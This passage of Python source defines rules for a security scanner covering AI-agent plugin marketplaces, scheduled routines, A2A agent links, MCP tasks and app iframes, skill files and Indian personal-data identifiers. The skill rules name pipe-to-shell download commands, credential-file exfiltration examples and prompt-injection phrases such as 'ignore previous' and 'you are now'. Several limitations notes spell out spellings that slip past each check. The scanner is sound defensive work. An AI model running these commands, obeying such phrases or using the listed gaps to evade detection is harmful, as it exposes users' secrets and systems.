    ".claude-plugin/marketplace.json lacks a signature or integrity hash "
    "field. An attacker with write access to the marketplace can replace "
    "the plugin bundle with no detection.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Add a Sigstore signature or subresource-integrity hash to each plugin "
    "entry. Verify on install.",
    sarif_name="MarketplaceUnsigned",
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-04"],
    limitations=(
        "Checks only that each entry in the `plugins` list of a marketplace.json has "
        "a key named `signature`, `integrity`, `sha256`, `sigstore` or `publicKey`, "
        "not that the value is a signature or that it verifies, so `\"signature\": "
        "\"TODO\"` passes. Plugins listed as an object instead of a list are not read, "
        "and a manifest that is not valid JSON is not checked for a signature at "
        "all: AAK-MARKETPLACE-005 reports that it could not be read."
    ),
)

_r(
    "AAK-MARKETPLACE-002",
    "Plugin permission set grants broad access",
    "A plugin's manifest grants access to filesystem, network, shell exec, "
    "or user-credential surfaces. Broad permissions should be opt-in after "
    "a clear user prompt.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Trim permissions to the minimum the plugin needs. Review any 'fs:*' "
    "or 'shell:exec' entries.",
    sarif_name="MarketplaceBroadPermissions",
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-SUPPLY-05"],
    limitations=(
        "Compares a plugin's `permissions` list with six exact strings: `fs:*`, "
        "`shell:exec`, `network:*`, `credentials:*`, `env:*` and `*:*`. The same "
        "grant spelled another way (`shell:*`, a bare `*`), in another case "
        "(`SHELL:EXEC`), or given as an object instead of a list is not reported."
    ),
)

_r(
    "AAK-MARKETPLACE-003",
    "Plugin name typosquats a well-known package",
    "A plugin entry uses a name that is one edit distance from a popular "
    "upstream (e.g. 'anthropic', 'langchain', 'mcp'). Typosquatting is the "
    "single highest-volume supply-chain attack vector in 2026.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Rename the plugin or flag it for manual review. Cross-reference against "
    "a known-upstream list.",
    sarif_name="MarketplaceTyposquat",
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-06"],
    limitations=(
        "Compares a plugin name with 13 upstream names (anthropic, claude, "
        "claude-code, claude-agent-sdk, mcp, model-context-protocol, langchain, "
        "langchain-core, langgraph, openai, openai-agents-sdk, gemini, google-adk) "
        "and reports one that is a single insertion, deletion, substitution or "
        "adjacent swap away. A name that extends an upstream (`claude-code-pro`, "
        "`anthropic-official`) or sits two edits away (`antrhopik`) is not "
        "reported."
    ),
)

_r(
    "AAK-MARKETPLACE-004",
    "Plugin source pins to a mutable git ref",
    "A plugin entry pins to a branch (main/master) or tag without commit "
    "SHA. The maintainer (or an attacker with write access) can silently "
    "change plugin behavior post-install — the 'maintainer takeover' "
    "pattern from the June 2024 xz incident and its 2026 re-runs.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Pin to an immutable commit SHA. Re-pin during a reviewed dependency "
    "bump.",
    sarif_name="MarketplaceMutableRef",
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-07"],
    limitations=(
        "Judges a plugin's `source` only when it is an object with a `ref`, "
        "`branch` or `tag` that is not 7 to 40 hex characters. A source with no ref "
        "at all, which follows the default branch, a source written as a string "
        "(`github:acme/tool@main`) and an all-digit tag such as `20260101`, which "
        "reads as a short commit hash, are not reported."
    ),
)

_r(
    "AAK-MARKETPLACE-005",
    "Marketplace manifest could not be read",
    "A `marketplace.json` is not valid JSON, is not UTF-8 text, or is JSON whose "
    "top level is not an object, so none of its plugin entries could be checked "
    "for a signature, broad permissions, a typosquatted name or a mutable source "
    "ref (AAK-MARKETPLACE-001..004). AAK reports this rather than skipping the "
    "file, which is what it used to do: a manifest the scanner cannot read is not "
    "a clean one, and a client that parses more leniently may still install what "
    "it lists.",
    Severity.LOW,
    Category.SUPPLY_CHAIN,
    "Fix the manifest so it is a UTF-8 JSON object (a trailing comma, a comment "
    "and an unquoted key are the usual causes), then re-run the scan so its "
    "plugins are audited. If the file is not a plugin marketplace manifest, "
    "rename it.",
    sarif_name="MarketplaceManifestUnreadable",
    # Same shape as AAK-IDE-TASK-004, the parse-failure rule for VS Code task
    # files, and LOW for the same reason: visible at the default reporting floor,
    # without failing `--fail-on medium` over a file the client cannot load either.
    owasp_agentic_references=["ASI04"],
)

# ---------------------------------------------------------------------------
# Claude Code Routines (AAK-ROUTINE-001..003)
#
# Routines (research preview, Apr 14 2026) run scheduled prompts non-
# interactively. Permission escalation via routine is the core new risk.
#
# References:
#   - Claude Code routines research preview.
#   - OWASP ASI02 (Tool Misuse and Exploitation) for over-privileged tool
#     access, and ASI10 (Rogue Agents), whose mitigations (least-privilege
#     scopes, signed audit logs) are what an unattended routine lacks.
#   - CWE-269 (Improper Privilege Management).
# ---------------------------------------------------------------------------

_r(
    "AAK-ROUTINE-001",
    "Routine grants broader permissions than interactive path",
    "A routine configuration declares tool permissions wider than what the "
    "same user has in interactive Claude Code. A routine running "
    "non-interactively at 3am with admin-level tools is an excessive-agency "
    "risk (OWASP ASI02 over-privileged tool access, with no human to notice).",
    Severity.HIGH,
    Category.AGENT_CONFIG,
    "Mirror routine permissions from the interactive grant. Require re-prompt "
    "for elevation.",
    sarif_name="RoutineWiderPerms",
    owasp_agentic_references=["ASI02", "ASI10"],
    adversa_references=["ADV-AGENCY-01"],
    limitations=(
        "Reads the `permissions` (or `tools`) list of a file in `.claude/routines/` "
        "and reports an entry only when it is exactly `fs:*`, `shell:exec`, "
        "`network:*`, `credentials:*`, `env:*` or `*:*`. Other spellings of the "
        "same breadth (`shell:*`, `Bash(*)`, `*`) are not reported, and neither is "
        "a `permissions` block written as a mapping (`allow: [...]`)."
    ),
)

_r(
    "AAK-ROUTINE-002",
    "Routine schedule interpolates unsanitized input",
    "A routine's cron expression, HTTP webhook URL, or GitHub event filter "
    "is built from a user-controlled value. Schedule injection can repurpose "
    "the routine at off-hours without review.",
    Severity.MEDIUM,
    Category.AGENT_CONFIG,
    "Treat schedule expressions as static constants; never build them from "
    "runtime state.",
    sarif_name="RoutineScheduleInjection",
    owasp_agentic_references=["ASI10"],
    adversa_references=["ADV-AGENCY-02"],
    limitations=(
        "Reads the first of `schedule`, `cron` or `trigger` that is set, and only "
        "when it is a string containing `${`, `{{` or `%{`, so a static `schedule` "
        "hides an interpolated `trigger` beside it. A `trigger` written as a "
        "mapping (`type: webhook` with a `url` holding `${TENANT}`), a webhook URL "
        "in a key of its own, and `$(...)` substitution are not read."
    ),
)

_r(
    "AAK-ROUTINE-003",
    "Routine executes without audit trail",
    "A routine runs tool calls but writes no run-log, making post-hoc audit "
    "impossible. An attacker with edit access to the routine file can run "
    "anything and delete the evidence.",
    Severity.MEDIUM,
    Category.AGENT_CONFIG,
    "Route every routine's output (and tool-call trace) to an append-only "
    "log the routine cannot modify.",
    sarif_name="RoutineNoAudit",
    owasp_agentic_references=["ASI10"],
    adversa_references=["ADV-AGENCY-03"],
    limitations=(
        "Looks for the key `audit_log`, `audit`, `log` or `output_log` and not at "
        "its value, so `audit_log: false` or an empty `log:` counts as an audit "
        "trail."
    ),
)

# ---------------------------------------------------------------------------
# A2A Protocol 2026 Gaps (AAK-A2A-008..012)
#
# Extends the existing AAK-A2A-001..007 family with the five gaps named in
# ROADMAP §2.2.
#
# References:
#   - A2A protocol (150+ orgs at one-year mark, Apr 9 2026).
#   - OWASP ASI03 (Identity and Privilege Abuse), ASI07 (Insecure
#     Inter-Agent Communication), ASI08 (Cascading Failures). A2A is not MCP,
#     so these rules carry no MCP Top 10 reference.
#   - CWE-287 (Improper Authentication), CWE-829 (Inclusion of Functionality
#     from Untrusted Control Sphere), CWE-294 (Auth Bypass by Capture-Replay),
#     CWE-502 (Deserialization).
# ---------------------------------------------------------------------------

_r(
    "AAK-A2A-008",
    "A2A connection lacks mutual authentication",
    "Two agents establish an A2A connection where only the caller "
    "authenticates. The callee is trusted by URL alone — easy to spoof.",
    Severity.HIGH,
    Category.A2A_PROTOCOL,
    "Require mutual authentication and declare it on the card: set `mutual` (or "
    "`mutual_tls`) to `true` in the `authentication` object, or use a `scheme` such as "
    "`mtls`. The rule fires when the scheme is bearer or OAuth and none of those is "
    "present.",
    sarif_name="A2aNoMutualAuth",
    owasp_agentic_references=["ASI03", "ASI07"],
    adversa_references=["ADV-A2A-05"],
    limitations=(
        "Reads `authentication.scheme`, a single string, and reports it when it "
        "contains `bearer` or `oauth` and the block declares no `mutual` flag or "
        "`mtls` scheme. A card that lists its schemes (`\"schemes\": [\"Bearer\"]`) or "
        "uses another scheme (`apikey`, `basic`) is not reported."
    ),
)

_r(
    "AAK-A2A-009",
    "Unbounded delegation in A2A call chain",
    "An A2A agent forwards incoming delegation tokens without reducing scope, "
    "allowing an N-deep chain to accumulate the caller's full rights.",
    Severity.HIGH,
    Category.A2A_PROTOCOL,
    "Reduce delegation scope at each hop; refuse to forward tokens that are "
    "already delegated beyond a small bound.",
    sarif_name="A2aUnboundedDelegation",
    owasp_agentic_references=["ASI03", "ASI08"],
    adversa_references=["ADV-A2A-06"],
    limitations=(
        "Reports a `delegation` block that sets neither `max_depth` nor `max_hops`. "
        "Any value satisfies it (`\"max_depth\": 1000` is accepted), and whether the "
        "scope shrinks at each hop is not examined."
    ),
)

_r(
    "AAK-A2A-010",
    "Transitive trust accepted in A2A",
    "An A2A agent trusts claims relayed by a peer without verifying the "
    "original issuer. 'Agent B says A says X' must not be treated as X.",
    Severity.HIGH,
    Category.A2A_PROTOCOL,
    "Require signed attestations from the original issuer; do not trust "
    "relayed claims.",
    sarif_name="A2aTransitiveTrust",
    owasp_agentic_references=["ASI03", "ASI08"],
    adversa_references=["ADV-A2A-07"],
    limitations=(
        "Reads one key, `trust.accepts_relayed_claims`, and only when it is the "
        "JSON boolean `true`. The string `\"true\"`, the spelling "
        "`acceptsRelayedClaims`, and any other key that accepts relayed claims "
        "(`relay_trust`) are not read."
    ),
)

_r(
    "AAK-A2A-011",
    "A2A tokens not anti-replay protected",
    "An A2A flow accepts tokens without nonce, timestamp, or jti checks, "
    "allowing captured messages to be replayed. Replay on trust chains is one "
    "of the OWASP ASI07 (Insecure Inter-Agent Communication) examples.",
    Severity.MEDIUM,
    Category.A2A_PROTOCOL,
    "Declare replay protection in the card's `tokens` block with `jti`, `nonce`, "
    "`require_jti` or `replay_window`, and enforce it: put `jti` or `nonce` and "
    "`iat`/`exp` claims in every token and reject a repeated `jti` inside the replay "
    "window.",
    sarif_name="A2aReplayable",
    owasp_agentic_references=["ASI07"],
    adversa_references=["ADV-A2A-08"],
    limitations=(
        "Checks that the `tokens` block contains a `jti`, `nonce`, `require_jti` or "
        "`replay_window` key and does not look at its value, so `\"require_jti\": "
        "false` or `\"replay_window\": 0` satisfies it. A card with no `tokens` "
        "block, or an empty one, is not examined."
    ),
)

_r(
    "AAK-A2A-012",
    "A2A schema confusion between major versions",
    "An A2A endpoint accepts messages without version discriminator, "
    "allowing a v1 payload to be interpreted by a v2 handler (or vice "
    "versa) with changed field semantics. Schema confusion is a "
    "message-semantics gap of the kind OWASP ASI07 (Insecure Inter-Agent "
    "Communication) names.",
    Severity.MEDIUM,
    Category.A2A_PROTOCOL,
    "Add a `schema_version` (or `a2a_version` or `apiVersion`) field to the Agent Card, "
    "and have the agent reject messages whose version does not match. The rule asks for "
    "it on cards that carry a `tokens`, `delegation` or `trust` section.",
    sarif_name="A2aSchemaConfusion",
    owasp_agentic_references=["ASI07"],
    adversa_references=["ADV-A2A-09"],
    limitations=(
        "Asks for a `schema_version`, `a2a_version` or `apiVersion` only from a "
        "card that has a `tokens`, `delegation` or `trust` block, and only checks "
        "that the key exists: a card with none of those blocks, or with "
        "`\"schema_version\": \"\"`, is not reported."
    ),
)

# ---------------------------------------------------------------------------
# MCP Tasks Primitive Leakage (AAK-TASKS-001..003)
#
# Tasks (SEP-1686) introduced an async working/input_required/completed/
# failed/cancelled state machine. Long-lived async state = long-lived
# credential exposure.
#
# References:
#   - MCP spec 2025-11-25 SEP-1686 (Tasks primitive).
#   - OWASP MCP07:2025 (Insufficient Authentication & Authorization),
#     MCP01:2025 (Token Mismanagement & Secret Exposure) and MCP10:2025
#     (Context Injection & Over-Sharing, whose checklist names a missing TTL).
#   - CWE-200 (Information Exposure), CWE-639 (Authorization Bypass Through
#     User-Controlled Key), CWE-613 (Insufficient Session Expiration).
# ---------------------------------------------------------------------------

_r(
    "AAK-TASKS-001",
    "MCP task read endpoint lacks per-task authorization",
    "A task read endpoint returns task state based on the task ID alone. "
    "Any caller that guesses or enumerates a task ID gets another user's "
    "data (CWE-639).",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Verify the caller is the task owner (or has an explicit grant) before "
    "returning task state.",
    sarif_name="TasksNoOwnerCheck",
    owasp_mcp_references=["MCP07:2025", "MCP10:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TASKS-01"],
    limitations=(
        "Reads only files that contain a task marker: `task_id`, a `class` whose name "
        "contains Task, `Task` or `task` directly followed by Manager, Store, Queue, "
        "Runner, Primitive or SEP-1686 (`TaskStore`), or `/tasks/{`, `/tasks/:` or "
        "`/tasks/<`. In them it looks for a Python `def` named get_task, read_task, "
        "task_read, get_by_id or findTask and clears it when one of the whole words "
        "owner, requesting_user, current_user, authenticated_user, principal, "
        "tenant_id or caller_id (any case; `owner_id` does not count) appears in the "
        "next 1200 characters. A TypeScript or JavaScript handler (`async function "
        "getTask`) and a file with no task marker are not matched, and the word "
        "`owner` counts even when the function only returns it."
    ),
)

_r(
    "AAK-TASKS-002",
    "MCP tasks persist credentials past completion",
    "A task record retains API keys / OAuth tokens after the task reaches "
    "a terminal state (completed/failed/cancelled). Long-lived credentials "
    "in persistent state are an obvious exfil target.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Zeroize credential fields when the task transitions to a terminal "
    "state. Keep only what a post-mortem actually needs.",
    sarif_name="TasksCredentialPersistence",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TASKS-02"],
    limitations=(
        "Looks for `self.credential`, `self.credentials`, `self.api_key`, "
        "`self.token`, `self.secret` or `self.password` assigned in a file with a task "
        "class and one of the words completed, failed, cancelled, done, finished or "
        "terminal (matched inside longer words too), and clears the finding when any "
        "`self.<name> = None`, `del self.<name>`, `clear_secret(`, `zeroize(` or "
        "`zero_ize(` appears in the file. A different attribute name "
        "(`self.access_token`) is not matched, and a clearing statement that never "
        "runs on the terminal transition, such as a `reset()` nothing calls, still "
        "counts."
    ),
)

_r(
    "AAK-TASKS-003",
    "MCP task has no TTL or cancellation path",
    "A task record has no expiration and no cancellation endpoint. Orphaned "
    "tasks accumulate forever, including their inputs.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Set a TTL on every task; expose a cancellation endpoint that zeroizes "
    "inputs and credentials.",
    sarif_name="TasksNoTtl",
    owasp_mcp_references=["MCP10:2025"],
    adversa_references=["ADV-TASKS-03"],
    limitations=(
        "Fires on a task class or store with no `ttl`, `expires_at`, `expiry` or "
        "`deadline` assignment and no `def cancel_*`, `abort_*` or `terminate_*` in "
        "the file. Any such assignment counts, whatever it applies to: a `ttl=60` on "
        "an unrelated cache call clears it."
    ),
)

_r(
    "AAK-TASKS-004",
    "MCP Tasks creation has no quota / concurrency bound (task-flood DoS)",
    "The MCP Tasks primitive (SEP-2663) exposes a task-creation path "
    "(`tasks/create`, `create_task`, `enqueue`, `submit`) with no per-caller "
    "quota, max-in-flight, or concurrency bound. Unbounded task creation lets a "
    "caller flood the server with long-running tasks and exhaust memory / worker "
    "capacity — a task-flood denial of service. This is distinct from a missing "
    "TTL / cancellation path (AAK-TASKS-003): a server may expire and cancel "
    "tasks yet still accept unlimited concurrent creation.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Bound task creation: a per-caller quota and a max-in-flight / concurrency "
    "cap (e.g. a bounded semaphore or a queue depth limit), and reject or "
    "back-pressure creation once the bound is reached.",
    sarif_name="TasksNoQuota",
    owasp_agentic_references=["ASI08"],
    adversa_references=["ADV-TASKS-04"],
    limitations=(
        "Fires when a file with a task class has a creation path (`tasks/create`; a "
        "`def` named create_task, add_task, spawn_task, start_task, `enqueue*` or "
        "`submit*`; or a call to `create_task(`, `enqueueTask(`, `submitTask(` or "
        "`addTask(`) and none of max_tasks, maxTasks, task_limit, quota, "
        "max_concurren*, concurrency_limit, max_in_flight, max_pending, rate_limit*, "
        "ratelimit, backpressure, Semaphore or BoundedSemaphore, in any case, with `_` "
        "or `-` between words optional (`maxInFlight`, `max-tasks`). `createTask(` is "
        "not recognised as a creation path, and a quota word in a comment counts as a "
        "bound."
    ),
)

# ---------------------------------------------------------------------------
# MCP 2026-07-28 spec-ahead pack — routable-header desync (SEP-2243) + MCP Apps
# UI hardening (SEP-1865). Static, deterministic, offline. Detectors:
# mcp_routing_desync, mcp_apps_ui. (The SEP-2468 `iss`-validation surface from
# the same RC is already shipped as AAK-OAUTH-006, not re-added here.)
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-ROUTING-DESYNC-001",
    "MCP routable header (Mcp-Method/Mcp-Name) trusted without body cross-check",
    "The 2026-07-28 spec (SEP-2243) adds routable request-metadata headers — "
    "`Mcp-Method` and `Mcp-Name` — so proxies can route and pre-authorize a "
    "JSON-RPC call from the HTTP header. This server/proxy makes a routing or "
    "authorization decision from that header but never cross-checks it against "
    "the authoritative JSON-RPC body `method`/`name`. A caller can set "
    "`Mcp-Method: tools/list` (allowed at the gateway) while the body invokes "
    "`tools/call` on a privileged tool — a header/body desync that smuggles the "
    "real call past the gate (confused-deputy). A flow that asserts the header "
    "equals the body method does not fire.",
    Severity.HIGH,
    Category.TRANSPORT_SECURITY,
    "Never authorize or route on `Mcp-Method`/`Mcp-Name` alone. Parse the "
    "JSON-RPC body and reject the request unless the routable header equals the "
    "body `method`/tool `name`; apply the security decision to the body.",
    sarif_name="McpRoutableHeaderBodyDesync",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI07"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Fires on a file that reads the `Mcp-Method` or `Mcp-Name` header and uses "
        "routing or allow-list words, unless the file also reads the JSON-RPC body's "
        "`method` (`body.get(\"method\")`, `payload[\"method\"]`). Any such read "
        "counts as the cross-check, including one that only logs the value and never "
        "compares it to the header."
    ),
)

_r(
    "AAK-MCP-APPS-001",
    "MCP Apps UI iframe rendered without a hardening sandbox",
    "An MCP Apps (SEP-1865) `text/html` UI resource is rendered in an `<iframe>` "
    "with no `sandbox` attribute, or with a self-defeating "
    "`sandbox=\"allow-scripts allow-same-origin\"` (which lets the framed "
    "document script the host origin). MCP Apps UI is server-controlled, "
    "untrusted content running next to the user's agent session; without a "
    "restrictive sandbox it executes in the host context (XSS / token theft / "
    "tool invocation).",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Render MCP Apps UI in a sandboxed iframe. Set an explicit `sandbox` and do "
    "NOT combine `allow-scripts` with `allow-same-origin`; drive tool calls over "
    "`postMessage` with origin checks rather than granting host-origin access.",
    sarif_name="McpAppsIframeNoSandbox",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-01"],
    limitations=(
        "Reads `.ts`, `.tsx`, `.js`, `.jsx`, `.mjs`, `.cjs`, `.html`, `.htm`, "
        "`.vue` and `.svelte` files that carry an MCP Apps marker (`ui://`, "
        "`@mcp-ui/`, `createUIResource` and similar). An `<iframe>` tag is judged "
        "by the value of its `sandbox`, but an iframe created in script is judged "
        "only by whether a sandbox is set at all: `frame.setAttribute(\"sandbox\", "
        "\"allow-scripts allow-same-origin\")` is not reported."
    ),
)

_r(
    "AAK-MCP-APPS-002",
    "MCP Apps UI content rendered without sanitization (DOM XSS)",
    "An MCP Apps (SEP-1865) UI writes content to the DOM through a raw-HTML sink "
    "(`innerHTML` / `outerHTML` / `insertAdjacentHTML` / React "
    "`dangerouslySetInnerHTML` / Vue `v-html` / Svelte `{@html}`) with no "
    "sanitizer (DOMPurify / `sanitize*` / escaping) in the file. Server- or "
    "tool-provided content reaching an unsanitized HTML sink is DOM XSS — the "
    "injected script runs in the app frame with access to its postMessage tool "
    "bridge.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Sanitize all server/tool-provided content before rendering (e.g. DOMPurify), "
    "or render as text. Never pass untrusted content to innerHTML / "
    "dangerouslySetInnerHTML / v-html without sanitization.",
    sarif_name="McpAppsUnsanitizedHtml",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-01"],
    limitations=(
        "Looks for `innerHTML =`, `outerHTML =`, `insertAdjacentHTML(`, "
        "`dangerouslySetInnerHTML`, `v-html` and `{@html`; jQuery's "
        "`.html(content)`, `document.write` and `iframe.srcdoc =` are not sinks "
        "here. Any mention of `sanitize`, `DOMPurify`, `escapeHtml`, `xss` or "
        "`purify` clears the whole file, an import that is never called included."
    ),
)

# ---------------------------------------------------------------------------
# Skill Poisoning (AAK-SKILL-001..005)
#
# References:
#   - Anthropic Skills 2.0 (renderer/discovery overhaul April 2026).
#   - ToxicSkills dataset (Snyk, 2026): 1,467 malicious payloads.
#   - OWASP Agentic Skills Top 10 AST01 (Malicious Skills) and AST04
#     (Insecure Metadata); OWASP ASI04 (Agentic Supply Chain Vulnerabilities).
#     Skills are not MCP, so these rules carry no MCP Top 10 reference.
#   - CWE-77 (Command Injection), CWE-94 (Code Injection), CWE-829
#     (Inclusion of Functionality from Untrusted Control Sphere).
# ---------------------------------------------------------------------------

_r(
    "AAK-SKILL-001",
    "SKILL.md contains a post-install / side-effect command",
    "A SKILL.md frontmatter or body declares a post-install or auto-run "
    "command (bash, curl, pipe-to-sh, wget). Skills should be declarative; "
    "arbitrary installation commands are a rug-pull risk.",
    Severity.CRITICAL,
    Category.TOOL_POISONING,
    "Remove the post-install command. If setup is genuinely required, "
    "document it for the user rather than auto-running it.",
    sarif_name="SkillPostInstallCommand",
    owasp_agentic_references=["ASI04", "ASI05"],
    owasp_ast_references=["AST01"],
    adversa_references=["ADV-SKILL-01"],
    limitations=(
        "Reads `SKILL.md` only. A download piped or substituted into a shell or "
        "interpreter (`curl ... | bash`, `bash -c \"$(curl ...)\"`) counts anywhere "
        "it names a remote host and no guardrail forbids it; `npm install -g`, "
        "`pip install --user`, `bash -c`, `sh -c` and `eval(` count only where a "
        "command starts. Not matched: those words inside a sentence (\"install the "
        "CLI with `npm install -g notes-cli`\"), a download saved and then run "
        "(`curl ... -o install.sh && sh install.sh`), `npx -y <package>`, and a "
        "script shipped beside the skill (`scripts/install.sh`)."
    ),
)

_r(
    "AAK-SKILL-002",
    "SKILL.md uses unicode steganography in tool descriptions",
    "A SKILL.md body contains hidden characters (bidi override, zero-width, "
    "tag-unicode) that render differently than they parse. This hides "
    "malicious tool-use instructions from human review.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Remove U+200B-U+200F, U+202A-U+202E, U+E0000-U+E007F and similar "
    "invisible / bidi characters from skill text.",
    sarif_name="SkillUnicodeSteg",
    owasp_agentic_references=["ASI01", "ASI04"],
    owasp_ast_references=["AST01"],
    adversa_references=["ADV-SKILL-02"],
    limitations=(
        "Reads `SKILL.md` only and matches U+200B to U+200F, U+202A to U+202E, "
        "U+2066 to U+2069, U+FEFF and the Unicode tag block (U+E0000 to U+E007F). "
        "Other invisible code points are not matched, such as the word joiner "
        "(U+2060) and the variation selectors (U+FE0F, U+E0100 to U+E01EF) that can "
        "carry smuggled text."
    ),
)

_r(
    "AAK-SKILL-003",
    "SKILL.md embeds data-exfiltration primitives",
    "A SKILL.md references outbound HTTP tools (fetch/curl/request) combined "
    "with instructions to send local data (files, environment, credentials).",
    Severity.CRITICAL,
    Category.TOOL_POISONING,
    "Remove the exfil instruction. Skills that genuinely need outbound HTTP "
    "should declare it explicitly with a documented purpose.",
    sarif_name="SkillExfilPrimitive",
    owasp_agentic_references=["ASI02", "ASI04"],
    owasp_ast_references=["AST01"],
    adversa_references=["ADV-SKILL-03"],
    limitations=(
        "Reads `SKILL.md` only and needs one of `fetch`, `axios.get/post/put`, "
        "`requests.get/post/put`, `urllib.request.urlopen`, "
        "`http.client.HTTPConnection`, `curl` or `wget` somewhere in the file and a "
        "local-secret reference (`os.environ`, `process.env`, `id_rsa`, "
        "`id_ed25519`, `readFile`, `readText`, `~/.ssh`, `.aws/credentials`, "
        "`.netrc`) anywhere else in it; the two are not tied together. A "
        "credential file off that list is not reported (`curl -T ~/.kube/config "
        "...`), and neither is exfiltration through `httpx.post` or `scp`."
    ),
)

_r(
    "AAK-SKILL-004",
    "SKILL.md description hijacks a trusted skill name",
    "A skill's frontmatter name or description mimics a well-known skill "
    "('pdf', 'docx', 'frontend-design') but the body declares unrelated / "
    "hostile instructions. Description hijacking is the ToxicSkills 2026 "
    "signature pattern.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Rename the skill to match its actual behavior. Cross-reference the name "
    "against the first-party skill directory.",
    sarif_name="SkillNameHijack",
    owasp_agentic_references=["ASI04"],
    owasp_ast_references=["AST01", "AST04"],
    adversa_references=["ADV-SKILL-04"],
    limitations=(
        "Compares only the frontmatter `name` of a `SKILL.md` with sixteen "
        "first-party skill names, and only a name within two characters of one in "
        "length (`pdfs`). A name that adds a qualifier (`pdf-pro`, `official-pdf`) "
        "is not matched, nor is a skill named exactly `pdf` that shadows the "
        "first-party one, and a description that says to use the skill instead of "
        "`pdf` is never compared."
    ),
)

_r(
    "AAK-SKILL-005",
    "SKILL.md frontmatter contains prompt-injection triggers",
    "A SKILL.md frontmatter or YAML header embeds phrases targeted at the "
    "loading model ('ignore previous', 'you are now', 'system:'). These are "
    "prompt-injection probes rather than legitimate skill metadata.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Remove the injection trigger. Skill frontmatter should only contain "
    "name, description, tags, and similar metadata.",
    sarif_name="SkillFrontmatterInjection",
    owasp_agentic_references=["ASI01", "ASI04"],
    owasp_ast_references=["AST04"],
    adversa_references=["ADV-SKILL-05"],
    limitations=(
        "Reads the frontmatter of `SKILL.md` (up to the closing `---`, or the first "
        "500 characters) for ten fixed phrases such as `ignore previous`, `you are "
        "now`, `disregard prior` and `system:`. The same instruction in other words "
        "(`ignore all previous instructions`, `disregard all prior rules`) is not "
        "matched, and the body of the skill is not read by this rule."
    ),
)


# ---------------------------------------------------------------------------
# India DPDP PII rule pack (AAK-INDIA-PII-001..006)
#
# References:
#   - India Digital Personal Data Protection Act 2023 §8(4) "reasonable
#     security safeguards"; §8(5) breach notification.
#   - DPDP Rules 2023, Rule 5(1)(a) — technical and organizational
#     measures to protect personal data.
#   - UIDAI Aadhaar Act; RBI circulars on UPI/IFSC.
#   - CWE-200 (Information Exposure), CWE-312 (Cleartext Storage of
#     Sensitive Information).
# ---------------------------------------------------------------------------

_r(
    "AAK-INDIA-PII-001",
    "Aadhaar number in source / config",
    "A 12-digit Aadhaar number passed the Verhoeff checksum and is "
    "embedded in project text. Aadhaar is restricted under the UIDAI "
    "Act and India DPDP §8(4). Storing in code is a reportable breach.",
    Severity.CRITICAL,
    Category.SECRET_EXPOSURE,
    "Remove the Aadhaar number. If Aadhaar is genuinely needed, route it "
    "through an encrypted vault (e.g. AWS KMS / Azure Key Vault) and never "
    "log or commit it.",
    sarif_name="IndiaAadhaarInCode",
    owasp_mcp_references=["MCP10:2025"],
    limitations=(
        "Reads source, config and text files by extension (`.py`, `.ts`, `.json`, "
        "`.yaml`, `.toml`, `.txt`, `.md` and a few more) for a Verhoeff-valid Aadhaar "
        "number. Any other extension is never opened: the rows of a customer export "
        "saved as `.csv` are not reported, while the same rows in a `.txt` file are."
    ),
)

_r(
    "AAK-INDIA-PII-002",
    "PAN (Permanent Account Number) in source / config",
    "A 10-char PAN (5 letters + 4 digits + 1 letter) was detected. "
    "PAN is tax-linked personal data under DPDP §8(4).",
    Severity.HIGH,
    Category.SECRET_EXPOSURE,
    "Remove the PAN. If needed for processing, tokenize it and store "
    "tokens, not raw PANs.",
    sarif_name="IndiaPanInCode",
    owasp_mcp_references=["MCP10:2025"],
    limitations=(
        "Reads a PAN written in capitals: five letters, four digits and a letter. The "
        "same PAN in lower case (`abcde1234f`) is not reported."
    ),
)

_r(
    "AAK-INDIA-PII-003",
    "UPI ID in source / config",
    "A UPI VPA (<handle>@<psp>) was detected. UPI IDs are payment identifiers "
    "regulated by NPCI and covered by DPDP §8(4).",
    Severity.HIGH,
    Category.SECRET_EXPOSURE,
    "Remove the UPI ID. Accept UPI addresses as runtime input only.",
    sarif_name="IndiaUpiInCode",
    owasp_mcp_references=["MCP10:2025"],
    limitations=(
        "Reads a UPI ID only when the handle after the `@` is one of fifteen "
        "payment-app handles (`@oksbi`, `@ybl`, `@paytm`, `@upi` and eleven more). An "
        "ID at any other handle, such as `@kotak`, is not reported."
    ),
)

_r(
    "AAK-INDIA-PII-004",
    "IFSC code in source / config",
    "An IFSC code (4 letters + 0 + 6 alnum) was detected. IFSC is a "
    "banking identifier; pairing it with an account number constitutes "
    "DPDP §8(4) 'sensitive personal data'.",
    Severity.MEDIUM,
    Category.SECRET_EXPOSURE,
    "Move IFSC codes out of source; look them up at runtime from RBI's "
    "public IFSC directory.",
    sarif_name="IndiaIfscInCode",
    owasp_mcp_references=["MCP10:2025"],
    limitations=(
        "Reads an IFSC code written in capitals: four letters, a `0` and six letters "
        "or digits. The same code in lower case (`sbin0001234`) is not reported."
    ),
)

_r(
    "AAK-INDIA-PII-005",
    "Indian mobile number in source / config",
    "An Indian +91 mobile number (starting 6/7/8/9) was detected. Phone "
    "numbers are personal data under DPDP §8(4).",
